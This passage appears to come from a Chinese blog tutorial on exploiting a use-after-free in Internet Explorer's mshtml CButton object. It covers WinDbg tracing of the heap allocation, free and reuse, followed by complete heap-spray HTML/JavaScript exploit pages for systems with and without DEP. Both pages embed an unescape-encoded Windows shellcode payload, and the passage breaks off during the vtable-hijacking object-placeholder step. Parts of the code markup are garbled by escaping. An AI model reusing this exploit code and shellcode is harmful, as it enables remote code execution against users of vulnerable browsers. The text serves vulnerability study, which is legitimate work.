class="hljs-value">“exploit()”</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">“a”</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre><br><p>利用windbg attach IE 后 输入g继续运行运行，点击运行阻止的内容 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628215513047?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628215336125?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><p>观察windbg中代码停止的位置 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628220802699?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>结果发现edi（目测是一个申请堆的地址）是无效地址，程序崩溃。 <br><br>这里应该取对象的虚表时发现地址不可取 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629082953874?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>下面会有调用虚表中的函数操作，那才是我们需要控制程序流的地方。<br><br><br><br><br></p><br><h1 id="0x03-漏洞原理">0x03 漏洞原理</h1><br><p>首先我们利用<code>!heap –p –a edi</code>查看堆的相关操作 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628232513455?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>我们从中可以看到，edi已经是释放后的堆了，这里<code>mov eax,dword ptr[edi]</code> <br><br>又对释放后的堆，再次使用。<br></p><br><p>下面有几个关键的问题没有解决：</p><br><ol><br><li>什么时候创建的堆</li><br><li>什么时候释放的堆</li><br><li>什么时候使用的堆</li><br></ol><br><h2 id="0x1-堆的创建">0x1 堆的创建</h2><br><p>为了方便查找堆的创建，在windbg加载IE后查看所有关于CButton的函数 <br><br>我们可以得到一些有用的信息<br></p><br><pre class="prettyprint"><code class=" hljs fsharp"><span class="hljs-number">0</span>:<span class="hljs-number">005</span>&gt; x mshtml!CButton::*<br><span class="hljs-number">6</span>a28f234 mshtml!CButton::HandleMessage = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ee18 mshtml!CButton::s_classdescTagButton = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ed83 mshtml!CButton::GetAAtype = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f862 mshtml!CButton::GetValueHelper = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ef62 mshtml!CButton::GetEnabled = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f36a mshtml!CButton::GetThemeState = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f75d mshtml!CButton::get_status = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ee41 mshtml!CButton::CreateElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;//很明显是一个按钮创建的过程</span><br><span class="hljs-number">6</span>a28f035 mshtml!CButton::Notify = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a0c4750 mshtml!CButton::s_StringTable = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f1e0 mshtml!CButton::GetFocusShape = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f8eb mshtml!CButton::SetStatusText = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f70d mshtml!CButton::put_status = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f128 mshtml!CButton::YieldCurrency = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a0b0d8c mshtml!CButton::GetBtnHelper = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ef95 mshtml!CButton::GetBorderInfo = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f2f0 mshtml!CButton::ClickAction = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a298d55 mshtml!CButton::createTextRange = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f87d mshtml!CButton::SetValueHelper = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28eda5 mshtml!CButton::GetClassDesc = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f3c2 mshtml!CButton::ApplyDefaultFormat = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ef0d mshtml!CButton::GetSubmitInfo = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a029d70 mshtml!CButton::s_apfnpdIHTMLButtonElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a0ad720 mshtml!CButton::s_acpi = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a0b0338 mshtml!CButton::GetNonThemedBorderInfo = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f10b mshtml!CButton::AddCtxInfoToStream = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a0c4740 mshtml!CButton::s_StringTableAggregate = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f337 mshtml!CButton::GetThemeProperties = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f7a3 mshtml!CButton::GetValue = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28edf4 mshtml!CButton::s_classdescButtonSubmit = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28eeb8 mshtml!CButton::Init2 = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a188ee4 mshtml!CButton::s_apHdlDescs = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a188f00 mshtml!CButton::s_ppropdescsInVtblOrderIHTMLButtonElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ed27 mshtml!CButton::<code>scalar deleting destructor&#39; = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;//猜测是按钮销毁的过程&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;a0c4780 mshtml!CButton::s_AssocVTablePtr = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;a0af828 mshtml!CButton::GetElement = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;69e765&lt;/span&gt;f0 mshtml!CButton::</code>vftable’ = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28edd0 mshtml!CButton::s_classdescButtonReset = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a034f04 mshtml!CButton::<code>vftable&#39; = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;a28ed27 mshtml!CButton::</code>vector deleting destructor’ = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28ed62 mshtml!CButton::SetAAtype = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">6</span>a28f9a6 mshtml!CButton::EnsureDefaultAttributes = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span><br><span class="hljs-number">69</span>fe3571 mshtml!CButton::GetDBindMethods = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span></code></pre><br><p>在上面我们可以找到两个比较有用的函数</p><br><pre class="prettyprint"><code class=" hljs delphi"><span class="hljs-number">6</span>a28ee41 mshtml!CButton::CreateElement = &lt;no <span class="hljs-keyword">type</span> information&gt;<span class="hljs-comment">//很明显是一个按钮创建的过程</span><br><span class="hljs-number">6</span>a28ed27 mshtml!CButton::<code>scalar deleting &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;destructor&lt;/span&gt;&#39; = &amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;//猜测是按钮销毁的过程&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们对这两个地方下断点，直接利用地址进行断点设置&lt;/p&gt;&lt;p&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170628234314578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/p&gt;&lt;p&gt;跟踪调试一下&lt;/p&gt;&lt;p&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170628234709488?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/p&gt;&lt;p&gt;我们发现了HeapAlloc函数 ，该函数位button按钮分配内存，查看一下分配的地址为0x70b2fa8 &lt;br&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170628235304136?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/p&gt;&lt;p&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170629000848146?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;&gt; &lt;br&gt;至此button的分配已经完成&lt;/br&gt;&lt;/img&gt;&lt;/p&gt;&lt;h2 id=&quot;0x2-堆的释放&quot;&gt;0x2 堆的释放&lt;/h2&gt;&lt;p&gt;刚刚我们把断点设在了mshtml!CButton::</code>scalar deleting destructor’  函数这 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628235600855?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>在函数的中间我们发现了释放堆的代码，前三个压栈的是函数的参数，最后一个压栈的是要释放内存的地址0x70b2fa8 发现与申请的时候内存地址相吻合 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628235714561?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><p></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629001001530?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>堆的释放就结束了。<br></p><br><h2 id="0x3-堆的重用">0x3 堆的重用</h2><br><p>就在刚一开始的时候，程序崩溃的地方，访问di内存地址无效，造成的程序崩溃，成为能够控制代码执行的地方 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629001047663?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><h2 id="0x4-与js代码结合分析">0x4 与JS代码结合分析</h2><br><p>前面一部分我们只知道了，在程序执行时汇编代码所做的的操作，如果对应到JS代码上，应该怎么理解。 <br><br>这里有几个猜想<br></p><br><ol><br><li>e1.appendChild(document.createElement(‘button’)); 执行了HeapAlloc函数</li><br><li>e2.outerText = “”; 把button对象释放了</li><br><li>e2.appendChild(document.createElement(‘body’)); 是的内存重用</li><br></ol><br><p>以上是对JS代码在堆上的操作进行的猜想。 <br><br>下面修改一下验证代码，将上述payload改成如下所示<br></p><br><pre class="prettyprint"><code class=" hljs coffeescript">    e0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">“a”</span>);<br>    e1 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">“div”</span>);<br>    e2 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">“q”</span>);<br>    e1.applyElement(e2);<br>    e1.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">‘button’</span>));<br>    alert(<span class="hljs-string">“init create”</span>);<br>    e1.applyElement(e0);<br>    e2.innerHTML = <span class="hljs-string">“”</span>;<br>    alert(<span class="hljs-string">“delete？”</span>);<br>    e2.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">‘body’</span>));<br>    alert(<span class="hljs-string">“end”</span>);</code></pre><br><p>经过试验得出以下结论 <br><br> e1.appendChild(document.createElement(‘button’)); 为内存初始申请 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629002326305?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>堆的释放和再次使用在<code>e2.innerHTML = “”;</code>之后 和 <code>e2.appendChild(document.createElement(‘body’));</code>之后<br><br><br></p><br><h1 id="0x04-利用代码编写">0x04 利用代码编写</h1><br><p>我们回到之前的程序崩溃的地方，edi中的值无效，所以取堆的dword的时候是没有值的。借着在虚表中查找函数地址，在虚表偏移0xDC的地方存在函数跳转的地址。整个正向的函数执行过程很清楚，具体是我们怎么使用这些条件。利用方法如下：</p><br><ol><br><li>在堆中喷满shellcode代码</li><br><li>替换CButton对象的dword值，到自己指定函数虚表中查找（可以是0x0c0c0c0c or 0x1c1c1c1c）</li><br><li><p>在虚表的0xDC偏移处，填写指定的shellcode地址</p><br><p>最后直接执行就是了</p></li><br></ol><br><p>这里利用了一个关键技术，堆喷射技术，该技术是一种payload传递技术，它充分利用了javascript的特性。</p><br><h2 id="0x1-堆喷射">0x1 堆喷射</h2><br><p>为了控制虚表以及偏移处函数地址，我们在不知道精确地址的情况下可以采用堆喷射技术。</p><br><h3 id="无dep保护的情况">无DEP保护的情况</h3><br><pre class="prettyprint"><code class=" hljs dos">&lt;html&gt;<br>&lt;head&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script&gt;<br>//堆喷射<br> //Fix BSTR spec<br> function alloc(bytes, mystr) {<br> while (mystr.length&lt;bytes) mystr += mystr;<br> return mystr.substr(<span class="hljs-number">0</span>, (bytes-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br> }<br><br> block_size = <span class="hljs-number">0</span>x1000;<br> Padding = ‘’;<br> NopSlide = ‘’;<br><br> var Shellcode =<br>unescape(‘<span class="hljs-envvar">%ud231%</span>u30b2<span class="hljs-envvar">%u8b64%</span>u8b12<span class="hljs-envvar">%u0c52%</span>u528b<span class="hljs-envvar">%u8b1c%</span>u0842<span class="hljs-envvar">%u728b%</span>u8b20<span class="hljs-envvar">%u8012%</span>u0c7e<span class="hljs-envvar">%u7533%</span>u89f2<span class="hljs-envvar">%u03c7%</span>u3c78<span class="hljs-envvar">%u578b%</span>u0178<span class="hljs-envvar">%u8bc2%</span>u207a<span class="hljs-envvar">%uc701%</span>ued31<span class="hljs-envvar">%u348b%</span>u01af<span class="hljs-envvar">%u45c6%</span>u3e81<span class="hljs-envvar">%u6957%</span>u456e<span class="hljs-envvar">%uf275%</span>u7a8b<span class="hljs-envvar">%u0124%</span>u66c7<span class="hljs-envvar">%u2c8b%</span>u8b6f<span class="hljs-envvar">%u1c7a%</span>uc701<span class="hljs-envvar">%u7c8b%</span>ufcaf<span class="hljs-envvar">%uc701%</span>u4b68<span class="hljs-envvar">%u6e33%</span>u6801<span class="hljs-envvar">%u4220%</span>u6f72<span class="hljs-envvar">%u2f68%</span>u4441<span class="hljs-envvar">%u6844%</span>u726f<span class="hljs-envvar">%u2073%</span>u7468<span class="hljs-envvar">%u6172%</span>u6874<span class="hljs-envvar">%u6e69%</span>u7369<span class="hljs-envvar">%u2068%</span>u6441<span class="hljs-envvar">%u686d%</span>u6f72<span class="hljs-envvar">%u7075%</span>u6368<span class="hljs-envvar">%u6c61%</span>u6867<span class="hljs-envvar">%u2074%</span>u6f6c<span class="hljs-envvar">%u2668%</span>u6e20<span class="hljs-envvar">%u6865%</span>u4444<span class="hljs-envvar">%u2620%</span>u6e68<span class="hljs-envvar">%u2f20%</span>u6841<span class="hljs-envvar">%u6f72%</span>u334b<span class="hljs-envvar">%u3368%</span>u206e<span class="hljs-envvar">%u6842%</span>u7242<span class="hljs-envvar">%u4b6f%</span>u7368<span class="hljs-envvar">%u7265%</span>u6820<span class="hljs-envvar">%u7465%</span>u7520<span class="hljs-envvar">%u2f68%</span>u2063<span class="hljs-envvar">%u686e%</span>u7865<span class="hljs-envvar">%u2065%</span>u6368<span class="hljs-envvar">%u646d%</span>u892e<span class="hljs-envvar">%ufee5%</span>u534d<span class="hljs-envvar">%uc031%</span>u5550%ud7ff’);<br><br><br> <span class="hljs-flow">for</span> (c = <span class="hljs-number">0</span>; c &lt; block_size; c++){<br> NopSlide += unescape(‘%u1c1c’);} //shellcode hou<br> NopSlide = NopSlide.substring(<span class="hljs-number">0</span>,block_size - (Shellcode.length));<br><br> var OBJECT = Shellcode + NopSlide;<br> OBJECT = alloc(<span class="hljs-number">0</span>xfffe0, OBJECT); // <span class="hljs-number">0</span>xfffe0 = <span class="hljs-number">1</span>mb<br><br> var evil = new Array();<br> <span class="hljs-flow">for</span> (var k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0</span>x350; k++) {<br> evil[k] = OBJECT.substr(<span class="hljs-number">0</span>, OBJECT.length);<br> }<br> alert(‘spray done !’);<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</code></pre><br><p>这一步只是将堆上喷满slip代码和shellcode。因为没有DEP所以不需要那么精准</p><br><h3 id="dep保护情况">DEP保护情况</h3><br><p>先贴上精准喷射代码</p><br><pre class="prettyprint"><code class=" hljs dos">&lt;html&gt;<br>&lt;head&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script&gt;<br>//堆喷射<br> //Fix BSTR spec<br> function alloc(bytes, mystr) {<br> while (mystr.length&lt;bytes) mystr += mystr;<br> return mystr.substr(<span class="hljs-number">0</span>, (bytes-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br> }<br><br> block_size = <span class="hljs-number">0</span>x1000;<br> padding_size = <span class="hljs-number">0</span>xdFe; //这里必须根据自己的电脑来配置 为了对齐<br> Padding = ‘’;<br> NopSlide = ‘’;<br><br> var Shellcode =<br>unescape(‘<span class="hljs-envvar">%ud231%</span>u30b2<span class="hljs-envvar">%u8b64%</span>u8b12<span class="hljs-envvar">%u0c52%</span>u528b<span class="hljs-envvar">%u8b1c%</span>u0842<span class="hljs-envvar">%u728b%</span>u8b20<span class="hljs-envvar">%u8012%</span>u0c7e<span class="hljs-envvar">%u7533%</span>u89f2<span class="hljs-envvar">%u03c7%</span>u3c78<span class="hljs-envvar">%u578b%</span>u0178<span class="hljs-envvar">%u8bc2%</span>u207a<span class="hljs-envvar">%uc701%</span>ued31<span class="hljs-envvar">%u348b%</span>u01af<span class="hljs-envvar">%u45c6%</span>u3e81<span class="hljs-envvar">%u6957%</span>u456e<span class="hljs-envvar">%uf275%</span>u7a8b<span class="hljs-envvar">%u0124%</span>u66c7<span class="hljs-envvar">%u2c8b%</span>u8b6f<span class="hljs-envvar">%u1c7a%</span>uc701<span class="hljs-envvar">%u7c8b%</span>ufcaf<span class="hljs-envvar">%uc701%</span>u4b68<span class="hljs-envvar">%u6e33%</span>u6801<span class="hljs-envvar">%u4220%</span>u6f72<span class="hljs-envvar">%u2f68%</span>u4441<span class="hljs-envvar">%u6844%</span>u726f<span class="hljs-envvar">%u2073%</span>u7468<span class="hljs-envvar">%u6172%</span>u6874<span class="hljs-envvar">%u6e69%</span>u7369<span class="hljs-envvar">%u2068%</span>u6441<span class="hljs-envvar">%u686d%</span>u6f72<span class="hljs-envvar">%u7075%</span>u6368<span class="hljs-envvar">%u6c61%</span>u6867<span class="hljs-envvar">%u2074%</span>u6f6c<span class="hljs-envvar">%u2668%</span>u6e20<span class="hljs-envvar">%u6865%</span>u4444<span class="hljs-envvar">%u2620%</span>u6e68<span class="hljs-envvar">%u2f20%</span>u6841<span class="hljs-envvar">%u6f72%</span>u334b<span class="hljs-envvar">%u3368%</span>u206e<span class="hljs-envvar">%u6842%</span>u7242<span class="hljs-envvar">%u4b6f%</span>u7368<span class="hljs-envvar">%u7265%</span>u6820<span class="hljs-envvar">%u7465%</span>u7520<span class="hljs-envvar">%u2f68%</span>u2063<span class="hljs-envvar">%u686e%</span>u7865<span class="hljs-envvar">%u2065%</span>u6368<span class="hljs-envvar">%u646d%</span>u892e<span class="hljs-envvar">%ufee5%</span>u534d<span class="hljs-envvar">%uc031%</span>u5550%ud7ff’);<br><br> <span class="hljs-flow">for</span> (p = <span class="hljs-number">0</span>; p &lt; padding_size; p++){<br> Padding += unescape(‘%u1c1c’);}<br><br> <span class="hljs-flow">for</span> (c = <span class="hljs-number">0</span>; c &lt; block_size; c++){<br> NopSlide += unescape(‘%u1c1c’);} //jmp<br> NopSlide = NopSlide.substring(<span class="hljs-number">0</span>,block_size - (Shellcode.length + Padding.length));<br><br> var OBJECT = Padding + Shellcode + NopSlide;<br> OBJECT = alloc(<span class="hljs-number">0</span>xfffe0, OBJECT); // <span class="hljs-number">0</span>xfffe0 = <span class="hljs-number">1</span>mb<br><br> var evil = new Array();<br> <span class="hljs-flow">for</span> (var k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0</span>x350; k++) {<br> evil[k] = OBJECT.substr(<span class="hljs-number">0</span>, OBJECT.length);<br> }<br> alert(‘spray done !’);<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</code></pre><br><p>因为我们需要构造rop链所以，需要知道准确的跳转地址，这里我们需要一定的尝试与计算 <br><br>首先我们不设置padding_size的大小 <br><br>及 <br><br><code>padding_size = 0x00; //offset to 0x0c0c0c0c inside our 0x1000 hex block</code><br><br><br></p><br><p>我们观察一下0x1c1c1c1c所处的第一个堆块的位置0x1c0e0020</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629103133507?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>0x1c1c1c1c距离0x1c0e0020<code>0x1c1c1c1c-0x1c0e0020=0xe1bfc</code> <br><br>因为每一个payload的大小是0x2000，这里引用别人的一张图，表述一下现在内存的情况 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629105137955?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p><br><p>所以这里<code>0xe1bfc%0x2000 = 0x1bfc</code> <br><br>又因为unescape使得两个字节成为了一个字节，所以这里在填充的时候除2 <br><br><code>padding_size = 0xdFe</code> <br><br>我们看一下效果，发现成功定位，下一步工作就是替换虚表地址 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629105252731?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br></p><br><h2 id="0x2-对象占位">0x2 对象占位</h2><br><p>这一步很关键，前面分析了edi为对象指针，在释放后重新使用。这一步我们见改写CButton的dword使他指向自己造的虚表，达到劫持程序流。</p><br><p>这里需要了解为什么会占位成功。</p><br><blockquote><br><p>关于堆分配器有几件事我们需要知道： <br><br>  (1)由于内存动态分配和释放，会产生堆碎片； <br><br>  (2)堆内存块释放。会由前端或后端分配器回收(依赖操作系统). 分配器类似于缓存服务那样优化内存块分配。像之前提到堆分配和释放产生堆碎片(=bad)，为了较少堆碎片，新分配一块内存时，堆分配器会直接返回之前释放的一块同样大小的内存。从而减少了新分配的次数(=good)； <br><br>  (3)虽然堆内存是动态分配，但是分配器往往会连续的分配内存块 (为了减少堆碎片)这意味着从攻击者的角度来看堆是确定的。 连续的分配内存我们就可以在某个可预测的地址上布置我们的数据。<br><br><br></p><br></blockquote><br><p>所以我们要申请一个和以前大小一样的内存空间，前面的内存申请已经很详细了，申请了0x58字节，所以我们这里也要重复申请0x58字节大小的内存。</p><br><pre class="prettyprint"><code class=" hljs cs"> <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x550</span>; i++)<span class="hljs-comment">//这里必须根据自己的电脑来配置</span><br> {<br>     arr_div[i]= document.createElement(<span class="hljs-string">“div”</span>);<br>     arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br> 